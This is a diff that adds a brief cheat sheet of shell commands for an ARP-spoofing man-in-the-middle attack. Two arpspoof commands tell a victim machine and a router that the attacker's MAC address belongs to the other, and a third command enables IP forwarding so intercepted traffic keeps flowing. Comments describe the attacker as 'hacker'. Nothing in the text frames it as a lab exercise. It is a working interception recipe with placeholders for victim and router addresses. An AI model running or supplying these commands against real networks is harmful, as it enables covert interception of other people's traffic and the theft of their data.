@@ -1,0 +1,6 @@
+
+# EXECUTE THESE TWO COMMANDS IN SEPARATE TERMINAL WINDOWS
+sudo arpspoof -i [INTERFACE_NAME] -t [VICTIM'S_IP] [ROUTER'S_IP] <== tell a victim machine that machine with MY MAC address has router's IP(or that i'm router)
+sudo arpspoof -i [INTERFACE_NAME] -t [ROUTER'S_IP] [VICTIM'S_IP] <== tell a router that machine with MY MAC address has victim's machine IP(or that i'm a victim)
+#NEXT EXECUTE THIS
+sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'  <== let hacker's machine work like a router
